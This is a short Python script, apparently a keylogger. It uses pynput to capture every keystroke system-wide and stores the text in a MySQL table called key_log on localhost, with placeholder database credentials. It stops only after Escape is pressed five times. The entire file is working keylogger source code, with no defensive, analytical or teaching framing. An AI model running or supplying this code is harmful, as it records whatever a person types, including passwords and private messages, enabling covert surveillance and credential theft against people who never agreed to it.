import mysql.connector
import pynput


from pynput.keyboard import Key,Listener

count = 0
keys = []


# Establish a connection to the MySQL database
conn = mysql.connector.connect(
    host='localhost',
    user='your_username',
    password='your_password',
    database='your_database'
)
cursor = conn.cursor()

# Create a table to store the key presses
cursor.execute('''
    CREATE TABLE IF NOT EXISTS key_log (
        id INT AUTO_INCREMENT PRIMARY KEY,
        key_press TEXT
    )
''')
conn.commit()

def on_press(key):
    global keys, count

    keys.append(key)
    count += 1
    print("{0} pressed".format(key))

    if count >= 1:
        count = 0
        write_to_database(keys)
        keys = []

def write_to_database(keys):
    key_str = ""
    for key in keys:
        k = str(key).replace("'", "")
        if k.find("backspace") > 0:
            key_str += "Backspace_key "
        elif k.find("enter") > 0:
            key_str += '\n'
        elif k.find("shift") > 0:
            key_str += "Shift_key "
        elif k.find("space") > 0:
            key_str += " "
        elif k.find("caps_lock") > 0:
            key_str += "caps_Lock_key "
        elif k.find("Key"):
            key_str += k

    # Insert the key presses into the database
    cursor.execute('INSERT INTO key_log (key_press) VALUES (%s)', (key_str,))
    conn.commit()

def on_release(key):
    global exit
    if key == Key.esc:
        exit += 1
        if exit == 5:
            # Close the database connection when the program exits
            conn.close()
            return False

exit = 0
with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()